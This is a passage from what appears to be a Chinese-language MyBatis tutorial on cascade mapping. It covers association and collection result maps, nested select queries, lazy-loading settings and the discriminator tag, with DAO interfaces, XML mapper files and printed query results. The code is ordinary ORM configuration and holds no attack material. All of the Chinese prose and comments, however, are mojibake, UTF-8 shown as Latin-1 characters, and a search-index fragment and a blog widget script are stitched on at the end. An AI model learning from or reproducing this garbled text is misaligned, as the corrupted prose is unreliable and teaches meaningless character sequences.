å¯èƒ½ä¼šä¸å¾—ä¸ä½¿ç”¨åˆ—åˆ«åæ¥é¿å…åœ¨ ResultSet ä¸­äº§ç”Ÿé‡å¤çš„åˆ—åã€‚æŒ‡å®š columnPrefix åˆ—åå‰ç¼€å…è®¸ä½ å°†å¸¦æœ‰è¿™äº›å‰ç¼€çš„åˆ—æ˜ å°„åˆ°ä¸€ä¸ªå¤–éƒ¨çš„ç»“æœæ˜ å°„ä¸­ã€‚ notNullColumn é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨è‡³å°‘ä¸€ä¸ªè¢«æ˜ å°„åˆ°å±æ€§çš„åˆ—ä¸ä¸ºç©ºæ—¶ï¼Œå­å¯¹è±¡æ‰ä¼šè¢«åˆ›å»ºã€‚ä½ å¯ä»¥åœ¨è¿™ä¸ªå±æ€§ä¸ŠæŒ‡å®šéç©ºçš„åˆ—æ¥æ”¹å˜é»˜è®¤è¡Œä¸ºï¼ŒæŒ‡å®šå Mybatis å°†åªåœ¨è¿™äº›åˆ—ä¸­ä»»æ„ä¸€åˆ—éç©ºæ—¶æ‰åˆ›å»ºä¸€ä¸ªå­å¯¹è±¡ã€‚å¯ä»¥ä½¿ç”¨é€—å·åˆ†éš”æ¥æŒ‡å®šå¤šä¸ªåˆ—ã€‚é»˜è®¤å€¼æ˜¯ æœªè®¾ç½®ï¼ˆunsetï¼‰ã€‚ autoMapping å¦‚æœè®¾ç½®è¿™ä¸ªå±æ€§ï¼ŒMyBatis å°†ä¼šä¸ºæœ¬ç»“æœæ˜ å°„å¼€å¯æˆ–è€…å…³é—­è‡ªåŠ¨æ˜ å°„ã€‚è¿™ä¸ªå±æ€§ä¼šè¦†ç›–å…¨å±€çš„å±æ€§ autoMappingBehaviorã€‚ç‰¹åˆ«æ³¨æ„ï¼Œæœ¬å±æ€§å¯¹å¤–éƒ¨çš„ç»“æœæ˜ å°„æ— æ•ˆï¼Œæ‰€ä»¥ä¸èƒ½æ­é… select æˆ– resultMap å…ƒç´ ä½¿ç”¨ã€‚é»˜è®¤å€¼æ˜¯ æœªè®¾ç½®ï¼ˆunsetï¼‰ã€‚ DAO æ¥å£ 12345public interface EmployeeMapper { public Employee getEmpAndDept(Long id);} SQL æ˜ å°„æ–‡ä»¶ 12345678910111213141516171819202122232425&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap type="com.clay.mybatis.bean.Employee" id="employeeResultMap"&gt; &lt;!-- idï¼šå®šä¹‰ä¸»é”®åˆ—çš„å°è£…è§„åˆ™ï¼› columnï¼šæŒ‡å®šåˆ—åï¼› propertyï¼šæŒ‡å®šå¯¹åº”çš„JavaBeanå±æ€§ï¼› --&gt; &lt;id column="id" property="id" /&gt; &lt;!-- å®šä¹‰æ™®é€šåˆ—çš„å°è£…è§„åˆ™ï¼Œå³ä½¿ä¸æŒ‡å®šæ™®é€šåˆ— MyBatis ä¹Ÿä¼šæŒ‰ç…§é»˜è®¤çš„è§„åˆ™è‡ªåŠ¨å°è£…ï¼Œä½†ä¸€èˆ¬éƒ½å…¨éƒ¨å†™ä¸Š --&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;!-- å®šä¹‰å•ä¸ªçº§è”å¯¹è±¡çš„å°è£…è§„åˆ™ï¼Œpropertyï¼šæŒ‡å®šå“ªä¸ªJavaBeanå±æ€§æ˜¯è”åˆçš„å¯¹è±¡ï¼ŒjavaTypeï¼šæŒ‡å®šå½“å‰è¿™ä¸ªå±æ€§çš„å¯¹è±¡ç±»å‹ï¼ˆå¿…å¡«ï¼‰ --&gt; &lt;association property="department" javaType="com.clay.mybatis.bean.Department"&gt; &lt;id column="dept_id" property="id" /&gt; &lt;result column="dept_name" property="name" /&gt; &lt;/association&gt; &lt;/resultMap&gt; &lt;select id="getEmpAndDept" resultMap="employeeResultMap"&gt; select emp.id, emp.last_name, emp.gender, emp.email, dept.id as dept_id, dept.name as dept_name from t_employee emp left join t_department dept on emp.dept_id = dept.id where emp.id = #{id} &lt;/select&gt;&lt;/mapper&gt; è‹¥å¸Œæœ› Department çš„ç»“æœæ˜ å°„å¯ä»¥è¢«é‡ç”¨ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„å†™æ³•ï¼š 123456789101112131415161718192021222324252627&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap type="com.clay.mybatis.bean.Employee" id="employeeResultMap"&gt; &lt;!-- idï¼šå®šä¹‰ä¸»é”®åˆ—çš„å°è£…è§„åˆ™ï¼› columnï¼šæŒ‡å®šåˆ—åï¼› propertyï¼šæŒ‡å®šå¯¹åº”çš„JavaBeanå±æ€§ï¼› --&gt; &lt;id column="id" property="id" /&gt; &lt;!-- å®šä¹‰æ™®é€šåˆ—çš„å°è£…è§„åˆ™ï¼Œå³ä½¿ä¸æŒ‡å®šæ™®é€šåˆ— MyBatis ä¹Ÿä¼šæŒ‰ç…§é»˜è®¤çš„è§„åˆ™è‡ªåŠ¨å°è£…ï¼Œä½†ä¸€èˆ¬éƒ½å…¨éƒ¨å†™ä¸Š --&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;!-- å®šä¹‰å•ä¸ªçº§è”å¯¹è±¡çš„å°è£…è§„åˆ™ --&gt; &lt;association property="department" javaType="com.clay.mybatis.bean.Department" resultMap="departmentResultMap" /&gt; &lt;/resultMap&gt; &lt;resultMap type="com.clay.mybatis.bean.Department" id="departmentResultMap"&gt; &lt;id column="dept_id" property="id" /&gt; &lt;result column="dept_name" property="name" /&gt; &lt;/resultMap&gt; &lt;select id="getEmpAndDept" resultMap="employeeResultMap"&gt; select emp.id, emp.last_name, emp.gender, emp.email, dept.id as dept_id, dept.name as dept_name from t_employee emp left join t_department dept on emp.dept_id = dept.id where emp.id = #{id} &lt;/select&gt;&lt;/mapper&gt; æŸ¥è¯¢ç»“æœ 1æ‰“å° getEmpAndDept() æ–¹æ³•çš„è°ƒç”¨ç»“æœï¼šEmployee [id=8, lastName=Tom, gender=1, email=tom@gmail.com, department=Department [id=1, name=å¼€å‘éƒ¨é—¨]] æ–¹å¼ä¸‰ï¼ˆåµŒå¥— Select æŸ¥è¯¢ï¼‰çº§è”æ˜ å°„é™¤äº†ä¸Šé¢çš„ä½¿ç”¨æ–¹å¼ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ resultMap çš„å­æ ‡ç­¾ association å®ç°åµŒå¥— Select æŸ¥è¯¢ï¼ˆä¹Ÿå«åˆ†æ®µæŸ¥è¯¢ï¼‰ã€‚æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-11ã€‚ å±æ€§è¯´æ˜ å±æ€§ æè¿° property æ˜ å°„åˆ°åˆ—ç»“æœçš„å­—æ®µæˆ–å±æ€§ã€‚å¦‚æœ JavaBean æœ‰è¿™ä¸ªåå­—çš„å±æ€§ï¼ˆpropertyï¼‰ï¼Œä¼šå…ˆä½¿ç”¨è¯¥å±æ€§ã€‚å¦åˆ™ MyBatis å°†ä¼šå¯»æ‰¾ç»™å®šåç§°çš„å­—æ®µï¼ˆfieldï¼‰ã€‚ æ— è®ºæ˜¯å“ªä¸€ç§æƒ…å½¢ï¼Œä½ éƒ½å¯ä»¥ä½¿ç”¨å¸¸è§çš„ç‚¹å¼åˆ†éš”å½¢å¼è¿›è¡Œå¤æ‚å±æ€§å¯¼èˆªã€‚æ¯”å¦‚ï¼Œä½ å¯ä»¥è¿™æ ·æ˜ å°„ä¸€äº›ç®€å•çš„ä¸œè¥¿ï¼šâ€œusernameâ€ï¼Œæˆ–è€…æ˜ å°„åˆ°ä¸€äº›å¤æ‚çš„ä¸œè¥¿ä¸Šï¼šâ€œaddress.street.numberâ€ã€‚ javaType ä¸€ä¸ª Java ç±»çš„å…¨é™å®šåï¼Œæˆ–ä¸€ä¸ªç±»å‹åˆ«åã€‚å¦‚æœä½ æ˜ å°„åˆ°ä¸€ä¸ª JavaBeanï¼Œé‚£ä¹ˆ MyBatis é€šå¸¸å¯ä»¥è‡ªåŠ¨æ¨æ–­ç±»å‹ã€‚ç„¶è€Œï¼Œå¦‚æœä½ æ˜ å°„åˆ°çš„æ˜¯ HashMapï¼Œé‚£ä¹ˆä½ åº”è¯¥æ˜ç¡®åœ°æŒ‡å®š javaType æ¥ä¿è¯è¡Œä¸ºä¸æœŸæœ›çš„ç›¸ä¸€è‡´ã€‚ jdbcType JDBC ç±»å‹ï¼Œæ‰€æ”¯æŒçš„ JDBC ç±»å‹å‚è§è¿™ä¸ªè¡¨æ ¼ä¹‹åçš„â€ æ”¯æŒçš„ JDBC ç±»å‹â€ã€‚åªéœ€è¦åœ¨å¯èƒ½æ‰§è¡Œæ’å…¥ã€æ›´æ–°å’Œåˆ é™¤çš„ä¸”å…è®¸ç©ºå€¼çš„åˆ—ä¸ŠæŒ‡å®š JDBC ç±»å‹ã€‚è¿™æ˜¯ JDBC çš„è¦æ±‚è€Œé MyBatis çš„è¦æ±‚ã€‚å¦‚æœä½ ç›´æ¥é¢å‘ JDBC ç¼–ç¨‹ï¼Œä½ éœ€è¦å¯¹å¯ä»¥ä¸ºç©ºå€¼çš„åˆ—æŒ‡å®šè¿™ä¸ªç±»å‹ã€‚ typeHandler ä½¿ç”¨è¿™ä¸ªå±æ€§ï¼Œä½ å¯ä»¥è¦†ç›–é»˜è®¤çš„ç±»å‹å¤„ç†å™¨ã€‚è¿™ä¸ªå±æ€§å€¼æ˜¯ä¸€ä¸ªç±»å‹å¤„ç†å™¨å®ç°ç±»çš„å…¨é™å®šåï¼Œæˆ–è€…æ˜¯ç±»å‹åˆ«åã€‚ column æ•°æ®åº“ä¸­çš„åˆ—åï¼Œæˆ–è€…æ˜¯åˆ—çš„åˆ«åã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¿™å’Œä¼ é€’ç»™ resultSet.getString(columnName) æ–¹æ³•çš„å‚æ•°ä¸€æ ·ã€‚ç‰¹åˆ«æ³¨æ„ï¼šåœ¨ä½¿ç”¨å¤åˆä¸»é”®çš„æ—¶å€™ï¼Œä½ å¯ä»¥ä½¿ç”¨ column="{prop1=col1,prop2=col2}" è¿™æ ·çš„è¯­æ³•æ¥æŒ‡å®šå¤šä¸ªä¼ é€’ç»™åµŒå¥— select æŸ¥è¯¢è¯­å¥çš„åˆ—åã€‚è¿™ä¼šä½¿å¾— prop1 å’Œ prop2 ä½œä¸ºå‚æ•°å¯¹è±¡ï¼Œè¢«è®¾ç½®ä¸ºå¯¹åº”åµŒå¥— select è¯­å¥çš„å‚æ•°ã€‚ select ç”¨äºåŠ è½½å¤æ‚ç±»å‹å±æ€§çš„æ˜ å°„è¯­å¥çš„ IDï¼Œå®ƒä¼šä» column å±æ€§æŒ‡å®šçš„åˆ—ä¸­æ£€ç´¢æ•°æ®ï¼Œä½œä¸ºå‚æ•°ä¼ é€’ç»™ç›®æ ‡ select è¯­å¥ã€‚ç‰¹åˆ«æ³¨æ„ï¼šåœ¨ä½¿ç”¨å¤åˆä¸»é”®çš„æ—¶å€™ï¼Œä½ å¯ä»¥ä½¿ç”¨ column="{prop1=col1,prop2=col2}" è¿™æ ·çš„è¯­æ³•æ¥æŒ‡å®šå¤šä¸ªä¼ é€’ç»™åµŒå¥— select æŸ¥è¯¢è¯­å¥çš„åˆ—åã€‚è¿™ä¼šä½¿å¾— prop1 å’Œ prop2 ä½œä¸ºå‚æ•°å¯¹è±¡ï¼Œè¢«è®¾ç½®ä¸ºå¯¹åº”åµŒå¥— select è¯­å¥çš„å‚æ•°ã€‚ fetchType å¯é€‰çš„ï¼Œæœ‰æ•ˆå€¼ä¸º lazy å’Œ eagerã€‚æŒ‡å®šå±æ€§åï¼Œå°†åœ¨æ˜ å°„ä¸­å¿½ç•¥å…¨å±€é…ç½®å‚æ•° lazyLoadingEnabled å±æ€§çš„å€¼ã€‚ DAO æ¥å£ 12345public interface DepartmentMapper { public Department getById(Long id);} 12345public interface EmployeeMapper { public Employee getEmpAndDept(Long id);} SQL æ˜ å°„æ–‡ä»¶ 123456789&lt;mapper namespace="com.clay.mybatis.dao.DepartmentMapper"&gt; &lt;select id="getById" parameterType="Long" resultType="com.clay.mybatis.bean.Department"&gt; select id, name from t_department where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 12345678910111213141516171819202122232425&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap type="com.clay.mybatis.bean.Employee" id="employeeResultMap"&gt; &lt;!-- idï¼šå®šä¹‰ä¸»é”®åˆ—çš„å°è£…è§„åˆ™ï¼› columnï¼šæŒ‡å®šåˆ—åï¼› propertyï¼šæŒ‡å®šå¯¹åº”çš„JavaBeanå±æ€§ï¼› --&gt; &lt;id column="id" property="id" /&gt; &lt;!-- å®šä¹‰æ™®é€šåˆ—çš„å°è£…è§„åˆ™ï¼Œå³ä½¿ä¸æŒ‡å®šæ™®é€šåˆ— MyBatis ä¹Ÿä¼šæŒ‰ç…§é»˜è®¤çš„è§„åˆ™è‡ªåŠ¨å°è£…ï¼Œä½†ä¸€èˆ¬éƒ½å…¨éƒ¨å†™ä¸Š --&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;!-- å®šä¹‰å•ä¸ªçº§è”å¯¹è±¡çš„å°è£…è§„åˆ™ï¼Œselectï¼šè¡¨æ˜å½“å‰ JavaBean å±æ€§æ˜¯è°ƒç”¨ select æŒ‡å®šçš„æ–¹æ³•æ¥æŸ¥å‡ºç»“æœï¼Œcolumnï¼šæŒ‡å®šå“ªä¸€åˆ—çš„å€¼ä½œä¸ºå‚æ•°ä¼ é€’ç»™è¿™ä¸ª select æ–¹æ³• --&gt; &lt;association property="department" javaType="com.clay.mybatis.bean.Department" select="com.clay.mybatis.dao.DepartmentMapper.getById" column="dept_id"&gt; &lt;/association&gt; &lt;/resultMap&gt; &lt;select id="getEmpAndDept" resultMap="employeeResultMap"&gt; select id, last_name, gender, email, dept_id from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; æŸ¥è¯¢ç»“æœ 1æ‰“å° getEmpAndDept() æ–¹æ³•çš„è°ƒç”¨ç»“æœï¼šEmployee [id=16, lastName=Tom, gender=1, email=tom@gmail.com, department=Department [id=1, name=å¼€å‘éƒ¨é—¨]] æ–¹å¼å››ï¼ˆé›†åˆçš„åµŒå¥—ç»“æœæ˜ å°„ï¼‰çº§è”æ˜ å°„é™¤äº†ä¸Šé¢çš„ä½¿ç”¨æ–¹å¼ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ resultMap çš„å­æ ‡ç­¾ association å®ç°é›†åˆçš„åµŒå¥—ç»“æœæ˜ å°„ï¼ˆé€‚ç”¨äºé›†åˆç±»å‹ï¼‰ã€‚æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-12ã€‚ DAO æ¥å£ 12345public interface DepartmentMapper { public Department getDeptById(Long id);} SQL æ˜ å°„æ–‡ä»¶ 12345678910111213141516171819202122&lt;mapper namespace="com.clay.mybatis.dao.DepartmentMapper"&gt; &lt;resultMap id="deptResultMap" type="com.clay.mybatis.bean.Department"&gt; &lt;id column="dept_id" property="id" /&gt; &lt;result column="dept_name" property="name" /&gt; &lt;!-- collection å®šä¹‰å…³è”é›†åˆç±»å‹çš„å±æ€§çš„å°è£…è§„åˆ™ï¼ŒofTypeï¼šæŒ‡å®šé›†åˆé‡Œé¢å…ƒç´ çš„ç±»å‹ --&gt; &lt;collection property="employees" ofType="com.clay.mybatis.bean.Employee"&gt; &lt;id column="emp_id" property="id" /&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;/collection&gt; &lt;/resultMap&gt; &lt;select id="getDeptById" parameterType="Long" resultMap="deptResultMap"&gt; select dept.id as dept_id, dept.name as dept_name, emp.id as emp_id, emp.last_name, emp.gender, emp.email from t_department dept left join t_employee emp on dept.id = emp.dept_id where dept.id = #{id} &lt;/select&gt;&lt;/mapper&gt; æŸ¥è¯¢ç»“æœ 1æ‰“å° getDeptById() æ–¹æ³•çš„è°ƒç”¨ç»“æœï¼šDepartment [id=1, name=å¼€å‘éƒ¨é—¨, employees=[Employee [id=1, lastName=Jim, gender=1, email=jim@gmail.com, department=null], Employee [id=2, lastName=Peter, gender=1, email=peter@gmail.com, department=null]]] æ–¹å¼äº”ï¼ˆé›†åˆçš„åµŒå¥— Select æŸ¥è¯¢ï¼‰çº§è”æ˜ å°„é™¤äº†ä¸Šé¢çš„ä½¿ç”¨æ–¹å¼ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ resultMap çš„å­æ ‡ç­¾ association å®ç°é›†åˆçš„åµŒå¥— Select æŸ¥è¯¢ï¼ˆä¹Ÿå«é›†åˆçš„åˆ†æ®µæŸ¥è¯¢ï¼Œé€‚ç”¨äºé›†åˆç±»å‹ï¼‰ã€‚æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-13ã€‚ DAO æ¥å£ 12345public interface DepartmentMapper { public Department getDeptById(Long id);} 12345public interface EmployeeMapper { public List&lt;Employee&gt; getByDept(Long deptId);} SQL æ˜ å°„æ–‡ä»¶ 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getByDept" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name, gender, email, dept_id from t_employee where dept_id = #{deptId} &lt;/select&gt;&lt;/mapper&gt; 1234567891011121314151617181920&lt;mapper namespace="com.clay.mybatis.dao.DepartmentMapper"&gt; &lt;resultMap id="deptResultMap" type="com.clay.mybatis.bean.Department"&gt; &lt;id column="id" property="id" /&gt; &lt;result column="name" property="name" /&gt; &lt;!-- collection å®šä¹‰å…³è”é›†åˆç±»å‹çš„å±æ€§çš„å°è£…è§„åˆ™ï¼ŒofTypeï¼šæŒ‡å®šé›†åˆé‡Œé¢å…ƒç´ çš„ç±»å‹ï¼Œselectï¼šè¡¨æ˜å½“å‰ JavaBean å±æ€§æ˜¯è°ƒç”¨ select æŒ‡å®šçš„æ–¹æ³•æ¥æŸ¥å‡ºç»“æœï¼Œcolumnï¼šæŒ‡å®šå“ªä¸€åˆ—çš„å€¼ä½œä¸ºå‚æ•°ä¼ é€’ç»™è¿™ä¸ª select æ–¹æ³• --&gt; &lt;collection property="employees" ofType="com.clay.mybatis.bean.Employee" select="com.clay.mybatis.dao.EmployeeMapper.getByDept" column="id" /&gt; &lt;/resultMap&gt; &lt;select id="getDeptById" parameterType="Long" resultMap="deptResultMap"&gt; select id, name from t_department where id = #{id} &lt;/select&gt;&lt;/mapper&gt; æŸ¥è¯¢ç»“æœ 1æ‰“å° getDeptById() æ–¹æ³•çš„è°ƒç”¨ç»“æœï¼šDepartment [id=1, name=å¼€å‘éƒ¨é—¨, employees=[Employee [id=1, lastName=null, gender=1, email=jim@gmail.com, department=null], Employee [id=2, lastName=null, gender=1, email=peter@gmail.com, department=null]]] åµŒå¥— Select æŸ¥è¯¢ &amp; å»¶è¿ŸåŠ è½½åµŒå¥— Select æŸ¥è¯¢è¿™ç§æ–¹å¼è™½ç„¶å¾ˆç®€å•ï¼Œä½†åœ¨å¤§å‹æ•°æ®é›†æˆ–å¤§å‹æ•°æ®è¡¨ä¸Šè¡¨ç°ä¸ä½³ï¼Œè¿™ä¸ªé—®é¢˜è¢«ç§°ä¸º N+1 æŸ¥è¯¢é—®é¢˜ã€‚æ¦‚æ‹¬åœ°è®²ï¼ŒN+1 æŸ¥è¯¢é—®é¢˜æ˜¯è¿™æ ·å­çš„ï¼š æ‰§è¡Œäº†ä¸€ä¸ªå•ç‹¬çš„ SQL è¯­å¥æ¥è·å–ç»“æœçš„ä¸€ä¸ªåˆ—è¡¨ï¼ˆå°±æ˜¯ +1ï¼‰ã€‚ å¯¹åˆ—è¡¨è¿”å›çš„æ¯æ¡è®°å½•ï¼Œæ‰§è¡Œä¸€ä¸ª select æŸ¥è¯¢è¯­å¥æ¥ä¸ºæ¯æ¡è®°å½•åŠ è½½è¯¦ç»†ä¿¡æ¯ï¼ˆå°±æ˜¯ Nï¼‰ã€‚ è¿™ä¸ªé—®é¢˜ä¼šå¯¼è‡´æˆç™¾ä¸Šåƒçš„ SQL è¯­å¥è¢«æ‰§è¡Œã€‚æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬ä¸å¸Œæœ›äº§ç”Ÿè¿™æ ·çš„åæœï¼Œåˆ™å¯ä»¥å…¨å±€é…ç½® MyBatis å¯ç”¨å»¶è¿ŸåŠ è½½ã€‚å½“å¯ç”¨å»¶è¿ŸåŠ è½½åï¼Œåªæœ‰çº§è”å±æ€§è¢«ä½¿ç”¨åˆ°çš„æ—¶å€™ï¼ŒMyBatis æ‰ä¼šå‘å‡ºæŸ¥è¯¢ SQLï¼Œä»¥æ­¤æé«˜çº§è”åŠ è½½çš„æ€§èƒ½ã€‚ 123456&lt;settings&gt; &lt;!-- å»¶è¿ŸåŠ è½½ --&gt; &lt;setting name="lazyLoadingEnabled" value="true" /&gt; &lt;!-- å±æ€§æŒ‰éœ€åŠ è½½ --&gt; &lt;setting name="aggressiveLazyLoading" value="false" /&gt;&lt;/settings&gt; lazyLoadingEnabledï¼šå»¶è¿ŸåŠ è½½ï¼Œé»˜è®¤å€¼ä¸º falseã€‚ aggressiveLazyLoadingï¼šæ§åˆ¶å…·æœ‰å»¶è¿ŸåŠ è½½ç‰¹æ€§çš„å¯¹è±¡çš„å±æ€§çš„åŠ è½½æƒ…å†µï¼Œtrue è¡¨ç¤ºå¦‚æœå¯¹å…·æœ‰å»¶è¿ŸåŠ è½½ç‰¹æ€§çš„å¯¹è±¡çš„ä»»æ„è°ƒç”¨ä¼šå¯¼è‡´è¿™ä¸ªå¯¹è±¡çš„å®Œæ•´åŠ è½½ï¼Œfalse è¡¨ç¤ºæ¯ç§å±æ€§æŒ‰ç…§éœ€è¦åŠ è½½ã€‚åœ¨ MyBatis 3.4.1ï¼ˆåŒ…å«ï¼‰ ç‰ˆæœ¬ä¹‹å‰ï¼Œé»˜è®¤å€¼ä¸º trueï¼Œä¹‹åé»˜è®¤å€¼ä¸º falseã€‚ å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè‹¥å…¨å±€é…ç½®ä¸é€‚åˆç‰¹å®šçš„éœ€æ±‚ï¼ŒMyBatis è¿˜ä¸ºæ­¤æä¾›äº†å±€éƒ¨å»¶æ—¶åŠ è½½åŠŸèƒ½ã€‚åœ¨ collection æˆ– association æ ‡ç­¾ä¸ŠåŠ å…¥å±æ€§å€¼ fetchType å°±å¯ä»¥äº†ï¼Œå…¶å–å€¼åˆ†åˆ«æ˜¯ eager å’Œ lazyã€‚ discriminator é‰´åˆ«å™¨çš„ä½¿ç”¨æœ‰æ—¶å€™ï¼Œä¸€ä¸ªæ•°æ®åº“æŸ¥è¯¢å¯èƒ½å¸Œæœ›æ ¹æ®ä¸åŒçš„æ¡ä»¶è¿”å›å¤šä¸ªä¸åŒçš„ç»“æœé›†ï¼ˆä½†æ€»ä½“ä¸Šè¿˜æ˜¯æœ‰ä¸€å®šçš„è”ç³»çš„ï¼‰ã€‚é‰´åˆ«å™¨ï¼ˆdiscriminatorï¼‰æ ‡ç­¾å°±æ˜¯è¢«è®¾è®¡æ¥åº”å¯¹è¿™ç§æƒ…å†µçš„ï¼Œå¦å¤–ä¹Ÿèƒ½å¤„ç†å…¶å®ƒæƒ…å†µï¼Œä¾‹å¦‚ç±»çš„ç»§æ‰¿å±‚æ¬¡ç»“æ„ã€‚ é‰´åˆ«å™¨çš„æ¦‚å¿µå¾ˆå¥½ç†è§£ï¼Œå®ƒå¾ˆåƒ Java è¯­è¨€ä¸­çš„ switch è¯­å¥ã€‚ä¸€ä¸ªé‰´åˆ«å™¨çš„å®šä¹‰éœ€è¦æŒ‡å®š column å’Œ javaType å±æ€§ã€‚column æŒ‡å®šäº† MyBatis æŸ¥è¯¢è¢«æ¯”è¾ƒå€¼çš„åœ°æ–¹ï¼Œè€Œ javaType ç”¨æ¥ç¡®ä¿ä½¿ç”¨æ­£ç¡®çš„ç›¸ç­‰æµ‹è¯•ï¼ˆè™½ç„¶å¾ˆå¤šæƒ…å†µä¸‹å­—ç¬¦ä¸²çš„ç›¸ç­‰æµ‹è¯•éƒ½å¯ä»¥å·¥ä½œï¼‰ã€‚å®Œæ•´çš„ä½¿ç”¨è¯´æ˜å¯æŸ¥çœ‹ å®˜æ–¹æ–‡æ¡£ï¼Œæœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-14ã€‚ DAO æ¥å£ 12345public interface DepartmentMapper { public Department getById(Long id);} 12345public interface EmployeeMapper { public Employee getEmpAndDept(Long id); } SQL æ˜ å°„æ–‡ä»¶ 123456789&lt;mapper namespace="com.clay.mybatis.dao.DepartmentMapper"&gt; &lt;select id="getById" parameterType="Long" resultType="com.clay.mybatis.bean.Department"&gt; select id, name from t_department where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 123456789101112131415161718192021222324252627282930&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap type="com.clay.mybatis.bean.Employee" id="employeeResultMap"&gt; &lt;!-- idï¼šå®šä¹‰ä¸»é”®åˆ—çš„å°è£…è§„åˆ™ï¼› columnï¼šæŒ‡å®šåˆ—åï¼› propertyï¼šæŒ‡å®šå¯¹åº”çš„JavaBeanå±æ€§ï¼› --&gt; &lt;id column="id" property="id" /&gt; &lt;!-- å®šä¹‰æ™®é€šåˆ—çš„å°è£…è§„åˆ™ï¼Œå³ä½¿ä¸æŒ‡å®šæ™®é€šåˆ— MyBatis ä¹Ÿä¼šæŒ‰ç…§é»˜è®¤çš„è§„åˆ™è‡ªåŠ¨å°è£…ï¼Œä½†ä¸€èˆ¬éƒ½å…¨éƒ¨å†™ä¸Š --&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;!-- ä½¿ç”¨é‰´åˆ«å™¨åˆ¤æ–­æŸåˆ—çš„å€¼ï¼Œç„¶åæ ¹æ®æŸåˆ—çš„å€¼æ”¹å˜å°è£…è¡Œä¸º --&gt; &lt;discriminator javaType="String" column="gender"&gt; &lt;case value="1" resultType="com.clay.mybatis.bean.Employee"&gt; &lt;!-- å®šä¹‰å•ä¸ªçº§è”å¯¹è±¡çš„å°è£…è§„åˆ™ï¼Œselectï¼šè¡¨æ˜å½“å‰ JavaBean å±æ€§æ˜¯è°ƒç”¨ select æŒ‡å®šçš„æ–¹æ³•æ¥æŸ¥å‡ºç»“æœï¼Œcolumnï¼šæŒ‡å®šå“ªä¸€åˆ—çš„å€¼ä½œä¸ºå‚æ•°ä¼ é€’ç»™è¿™ä¸ªselectæ–¹æ³• --&gt; &lt;association property="department" javaType="com.clay.mybatis.bean.Department" select="com.clay.mybatis.dao.DepartmentMapper.getById" column="dept_id"&gt; &lt;/association&gt; &lt;/case&gt; &lt;/discriminator&gt; &lt;/resultMap&gt; &lt;select id="getEmpAndDept" resultMap="employeeResultMap"&gt; select id, last_name, gender, email, dept_id from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; ä¸Šè¿°çš„ discriminator æ ‡ç­¾ä½œç”¨æ˜¯ï¼Œå½“ Employeeï¼ˆå‘˜å·¥ï¼‰ çš„ genderï¼ˆæ€§åˆ«ï¼‰ å±æ€§ä¸º 1 æ—¶ï¼Œæ‰çº§è”æŸ¥è¯¢ Departmentï¼ˆéƒ¨é—¨ï¼‰ çš„ä¿¡æ¯ï¼Œå¦åˆ™ä¸çº§è”æŸ¥è¯¢ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"ORM æ¡†æ¶é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/c3108f98.html",text:'MyBatisMyBatis å››å¤§å¯¹è±¡å››å¤§å¯¹è±¡ä»‹ç»MyBatis çš„å››å¤§å¯¹è±¡åŒ…æ‹¬ï¼šExecutorã€StatementHandlerã€ParameterHandlerã€ResultSetHandlerã€‚å››å¤§å¯¹è±¡çš„å·¥ä½œèŒè´£å¦‚ä¸‹ï¼š 